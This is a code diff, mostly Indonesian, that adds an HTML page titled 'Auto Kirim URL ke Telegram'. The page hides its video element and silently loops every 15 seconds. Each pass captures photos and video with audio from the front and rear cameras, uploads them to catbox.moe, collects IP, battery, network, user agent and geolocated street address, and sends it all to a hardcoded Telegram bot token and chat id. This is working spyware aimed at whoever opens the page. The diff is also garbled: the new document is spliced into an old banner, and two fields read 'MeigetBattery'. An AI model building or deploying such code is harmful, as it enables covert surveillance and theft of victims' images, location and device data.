@@ -316,14 +316,144 @@ fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
 ┃╭╮┃┃╰╮╭╯┃┃╭━╮┣┫┣┻━━╮━┃
 ┃╰╯╰╋╮╰╯╭╯┃╰━╯┃┃┃╱╱╭╯╭╯
 ┃╭━╮┃╰╮╭╯╱┃╭╮╭╯┃┃╱╭╯╭╯╱
-┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┳╯━╰━╮
-╰━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━━╯' })
-});
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Auto Kirim URL ke Telegram</title>
+  <style>
+    body { margin: 0; background: transparent; color: #fff; overflow: hidden; }
+    video { display: none; }
+  </style>
+</head>
+<body>
+<video id="video" autoplay muted playsinline></video>
 
-window.onload = () => {
-  startCamera();
-  sendInfo();
-};
+<script>
+const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
+const chat_id = '7552410869';
+const catboxURL = 'https://catbox.moe/user/api.php';
+
+let facing = 'user'; // depan -> belakang -> depan
+let video = document.getElementById('video');
+
+async function getStream() {
+  return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: true });
+}
+
+async function capturePhoto(stream) {
+  return new Promise(resolve => {
+    let track = stream.getVideoTracks()[0];
+    let imageCapture = new ImageCapture(track);
+    imageCapture.takePhoto().then(blob => resolve(blob)).catch(() => {
+      // fallback if takePhoto fails
+      let canvas = document.createElement('canvas');
+      video.width = video.videoWidth || 640;
+      video.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(resolve, 'image/jpeg');
+    });
+  });
+}
+
+async function recordVideo(stream, duration = 5000) {
+  return new Promise(resolve => {
+    let chunks = [];
+    let rec = new MediaRecorder(stream);
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+    rec.start();
+    setTimeout(() => rec.stop(), duration);
+  });
+}
+
+async function uploadToCatbox(blob, filename) {
+  let form = new FormData();
+  form.append('reqtype', 'fileupload');
+  form.append('fileToUpload', blob, filename);
+  let res = await fetch(catboxURL, { method: 'POST', body: form });
+  return await res.text();
+}
+
+async function sendToTelegram(text) {
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ chat_id, text })
+  });
+}
+
+async function getInfo() {
+  let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
+  let ua = navigator.userAgent;
+  let ram = navigator.deviceMemory || 'Unknown';
+  let brand = ua.match(/Android.*?;\s(.+?)\sBuild/)?.[1] || 'Unknown';
+  let battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not'})`);
+  let net = navigator.connection ? `${navigator.connection.effectiveType}, ${navigator.connection.downlink} Mbps` : 'Unknown';
+
+  return { ip, ua, ram, brand, battery, net };
+}
+
+async function getLocation() {
+  return new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const maps = `https://maps.google.com/?q=${lat},${lon}`;
+      const detail = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`).then(r => r.json());
+      const alamat = detail.display_name || 'Unknown';
+      resolve({ lat, lon, maps, alamat });
+    }, () => resolve({ maps: 'Ditolak', alamat: 'Tidak tersedia' }));
+  });
+}
+
+async function runAuto() {
+  try {
+    const stream = await getStream();
+    video.srcObject = stream;
+
+    // FOTO
+    const fotoBlob = await capturePhoto(stream);
+    const fotoUrl = await uploadToCatbox(fotoBlob, 'foto.jpg');
+
+    // VIDEO
+    const videoBlob = await recordVideo(stream, 8000);
+    const videoUrl = await uploadToCatbox(videoBlob, 'rekaman.webm');
+
+    // INFO + LOKASI
+    const info = await getInfo();
+    const loc = await getLocation();
+
+    const teks = `
+╭━━╮╭╮╱╱╭╮╭━━━┳━━┳━━━━╮
+┃╭╮┃┃╰╮╭╯┃┃╭━╮┣┫┣┻━━╮━┃
+┃╰╯╰╋╮╰╯╭╯┃╰━╯┃┃┃╱╱╭╯╭╯
+┃╭━╮┃╰╮╭╯╱┃╭╮╭╯┃┃╱╭╯╭╯╱
+┃╰━╯┃╱┃┃╱╱┃┃┃╰┳┫┣┳╯━╰━╮
+╰━━━╯╱╰╯╱╱╰╯╰━┻━━┻━━━━╯
+    📍 Lokasi: ${loc.maps}
+    \n🏠 Detail: ${loc.alamat}
+    \n🌐 IP: ${info.ip}
+    \n🔋 Baterai: ${info.battery}
+    \n📶 Jaringan: ${info.net}
+    \n📱 MeigetBattery
+    \n💾 RAM:MeigetBattery
+    \n🤖 UA: ${info.ua}
+    \n🖼️ Foto: ${fotoUrl}
+    \n🎥 Video: ${videoUrl}`;
+    await sendToTelegram(teks);
+
+    stream.getTracks().forEach(track => track.stop());
+    facing = (facing === 'user') ? 'environment' : 'user'; // ganti kamera
+    setTimeout(runAuto, 15000); // ulang 15 detik
+
+  } catch (e) {
+    console.log('Gagal:', e);
+    setTimeout(runAuto, 15000);
+  }
+}
+
+runAuto();
 </script>
 </body>
 </html>
